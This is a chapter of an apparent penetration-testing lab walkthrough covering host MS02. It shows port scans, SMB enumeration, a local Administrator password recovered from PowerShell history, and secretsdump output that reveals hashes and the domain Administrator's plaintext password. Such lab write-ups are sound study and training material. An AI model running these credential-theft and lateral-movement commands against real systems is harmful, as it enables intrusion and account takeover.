# 11 — MS02 through the tunnel

MS02 is the host pass 2 spent six chapters on. In this pass it is reachable through the tunnel
for the first time, so it gets a full scan — and then the pass walks past it. This chapter records
what it exposed, the clock problem it created, and why it was not the way in.

---

## 11.1 The scan

```bash
nmap -p- -T4 --min-rate 10000 --max-retries 2 -n -Pn -sC -sV -A 10.10.131.148
```

```
Nmap scan report for 10.10.131.148
Host is up (0.056s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC

Host script results:
|_clock-skew: 26m04s
|_nbstat: NetBIOS name: MS02, NetBIOS user: <unknown>, NetBIOS MAC: fa:16:3e:3c:33:5f (unknown)
| smb2-time:
|   date: 2026-11-26T05:18:26
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 228.09 seconds
```

The retransmission warning and the timing-stats lines are omitted. The host drops everything
else — consistent with a host firewall — which is why `65528` ports are `filtered` rather than
`closed` and why the scan took nearly four minutes.

---

## 11.2 Reading the ports

| Port | Service | What it means here |
|---|---|---|
| `135`, `49664`, `49667` | MSRPC | endpoint mapper and dynamic RPC — enumeration surface, no credential |
| `139`, `445` | SMB | file sharing; signing **enabled but not required** |
| `5040` | unknown | a Windows service port; not enough banner to identify it |
| `5985` | WinRM | a shell for anyone in `Remote Management Users` |

The capture's all-port scan is **incomplete**, and a follow-up pass proves it. A second
`nmap -sV` over the same tunnel (2026-11-25 21:38) found two more listeners:

| Port | Service | Detail |
|---|---|---|
| `1433` | `ms-sql-s` | **Microsoft SQL Server 2019 15.00.2000** |
| `5986` | WinRM over TLS | `Microsoft HTTPAPI httpd 2.0` (SSL) |

Both were missing from the first run, which reported `65528` filtered ports. Treat that output as
evidence of what it saw, not as an inventory: when a host firewall drops packets instead of
resetting, an `-p-` sweep is timing-dependent, and this one had already spent 228 seconds.

`1433` changes the picture. The SQL service that pass 2 built chapters 03 and 07 around **is**
exposed in this instantiation, and `eric.wallows` holds a login on it — the follow-up spray
authenticated as `oscp.exam\Eric.Wallows:EricLikesRunning800`. Whether that login is `sysadmin`
was **not** checked here, so the `xp_cmdshell` road is open in principle and unmeasured.

`signing enabled but not required` is the one configuration worth flagging: it makes MS02 a valid
relay target in principle. Nothing was coerced into authenticating during this pass, so it stayed
a note rather than a path.

---

## 11.3 The 26-minute clock

`nmap` reports `clock-skew: 26m04s`, and `smb2-time` puts the host at
`2026-11-26T05:18:26Z` while Kali is at `2026-11-25 20:49 PST`. Kerberos rejects any request
more than five minutes off the KDC, so every Kerberos operation will fail until this is fixed.

The obvious tools did not work:

```bash
sudo rdate -n 10.10.131.148
```

```
rdate: Not enough valid responses received in time
rdate: Unable to get a reasonable time estimate
```

```bash
sudo ntpdate -u 10.10.131.148
```

```
ntpdig: no eligible servers
```

`ntpdate` is `ntpdig` on this Kali, and MS02 is not offering time service on the query port. With
the target unreachable as a time source, the clock was moved by hand:

```bash
sudo date -s "$(date -d '+0 hour 26 minutes 04 seconds' '+%Y-%m-%d %H:%M:%S')"
```

```
Wed Nov 25 09:21:36 PM PST 2026
```

That aligns Kali with the host to within a few seconds. It is a lab workaround, not a fix: the
clock will drift again, and on a real engagement setting the system time by hand can break
tickets, logs and file timestamps in ways that are harder to diagnose than the skew. Prefer a
reachable NTP source, or correct only the offset when the tooling allows it.

---

## 11.4 Why MS02 was not needed

MS02 was reachable, enumerated, and no attack on it appears in this capture. That is not an
oversight — the credential that finishes the set was already in hand:

- the DCC2 entry in chapter 09 is the **domain** Administrator, so it applies to DC01 directly;
- the SQL login on `1433` was never tested for `sysadmin`, so it was an unknown, not a lead;
- attacking MS02 would have added a hop, not removed one.

Pass 2 reached the opposite conclusion for a different position: with DC01 direct, MS02 was the
only host whose token could be escalated, so `sql_svc` was the plan. Here the plan is unnecessary
— and that is the useful comparison. The "second hop" is not always on the path.

| Host | Address | State after this chapter |
|---|---|---|
| MS01 | `10.10.131.147` | SYSTEM, local admin add in place |
| MS02 | `10.10.131.148` | reachable · enumerated · **no attack in this capture** |
| DC01 | `10.10.131.146` | not contacted yet — credential in hand |

---

## 11.5 `web_svc` on MS02: what the shares are worth

`web_svc:Diamond1` authenticates over SMB, and the share table is a dead end on this build too —
the same three entries chapter 01 recorded on `10.10.152.142`:

```
SMB  10.10.131.148  445  MS02      ADMIN$                          Remote Admin
SMB  10.10.131.148  445  MS02      C$                              Default share
SMB  10.10.131.148  445  MS02      IPC$            READ            Remote IPC
```

A blank permission column is not "denied", it is "no access": `ADMIN$` and `C$` require local
administrator. Both were tried:

```
$ smbclient //10.10.131.148/C$ -U 'OSCP.EXAM\web_svc%Diamond1' -c 'ls'
tree connect failed: NT_STATUS_ACCESS_DENIED

$ smbclient //10.10.131.148/IPC$ -U 'OSCP.EXAM\web_svc%Diamond1' -c 'ls'
NT_STATUS_NO_SUCH_FILE listing \*
```

`IPC$` is not storage. It is the endpoint SMB carries RPC over, so `READ` on it means *you may open
pipes*, not *you may read files*. To read anything, a share has to show `READ` or `WRITE`:

```bash
smbmap -H 10.10.131.148 -u web_svc -p Diamond1 -r
impacket-smbclient 'oscp.exam/web_svc:Diamond1@10.10.131.148'
#   shares
#   use C$
#   ls
```

With `web_svc` alone there is nothing to open — the denial above is the honest end of that avenue,
exactly as chapter 01 concluded. Shares become readable only *after* the account is a local
administrator, which is a different chapter.

What `IPC$` does buy is RPC. `impacket-lookupsid` returns MS02's local account set:

```
[*] Domain SID is: S-1-5-21-2512333080-3128024849-3533006164
500:  MS02\Administrator (SidTypeUser)
501:  MS02\Guest (SidTypeUser)
503:  MS02\DefaultAccount (SidTypeUser)
504:  MS02\WDAGUtilityAccount (SidTypeUser)
1003: MS02\cloudbase-init (SidTypeUser)
1004: MS02\Admin (SidTypeUser)
```

A user list, no password. It confirms `Administrator` (RID 500) exists — which is all it is good for
until that account's password is in hand.

---

## 11.6 The MS02 local Administrator, end to end

MS02's local `Administrator` password is not cracked and not guessed. It is **typed by an
administrator on MS01**, into a file that records command history. As `Administrator` on MS01
(chapter 08):

```powershell
type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```
C:\users\support\admintool.exe hghgib6vHT3bVWf cmd
C:\users\support\admintool.exe cmd
shutdown /s /t 7
```

A helper was run with the local-admin password as an argument, and `PSReadLine` kept the line. Two
checks tie that string to MS02 rather than MS01:

1. `NTLM(hghgib6vHT3bVWf)` = `507e8b20766f720619e9f33d73756b34`, byte-for-byte MS02's SAM
   `Administrator:500` hash. MS01's is `3c4495bb…` (`December31`) — different accounts, different
   passwords.
2. Presented as a **local** logon it is administrative:

```
$ nxc smb 10.10.131.148 -u Administrator -p 'hghgib6vHT3bVWf' --local-auth
SMB  10.10.131.148  445  MS02  [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS02) (domain:MS02) (signing:False) (SMBv1:None)
SMB  10.10.131.148  445  MS02  [+] MS02\Administrator:hghgib6vHT3bVWf (Pwn3d!)
```

`--local-auth` is the whole trick. Sent to the *domain* instead (`-d oscp.exam`), `Administrator`
resolves to the domain account, not to MS02's SAM — which is why the domain-scoped sprays in this
run never touched it.

Now the registry opens, and MS02's `SECURITY` hive pays better than its cache:

```
$ impacket-secretsdump 'Administrator':'hghgib6vHT3bVWf'@10.10.131.148
Administrator:500:aad3b435b51404eeaad3b435b51404ee:507e8b20766f720619e9f33d73756b34:::
OSCP.EXAM/Administrator:$DCC2$10240#Administrator#a3a38f45ff2adaf28e945577e9e2b57a: (2023-03-02 09:08:34+00:00)
[*] DefaultPassword
OSCP.exam\Administrator:7Tg9M9MZbzAokR9
```

`DefaultPassword` is the domain Administrator's password **in plaintext** — the same credential the
DCC2 entry in chapter 09 protects. On this set the cache crack is therefore optional: MS02's LSA
secret hands over the same value without a wordlist.

The per-host variation is the general lesson. On MS01 the same secret class held
`oscp.exam\celia.almeda:7k8XHk3dMtmpnC7`; on MS02 it holds the domain Administrator. `DefaultPassword`
is whatever the image baked in — read it on every host, not only the hashes around it.

Two orderings reach the same credential:

```
MS01 SYSTEM → PSReadLine history → MS02 local Administrator → MS02 LSA secrets → domain Administrator
MS01 SYSTEM → MS01 DCC2 cache → domain Administrator
```

This run took the second. The first needs one extra hop and no cracking at all.

DC01 is next.
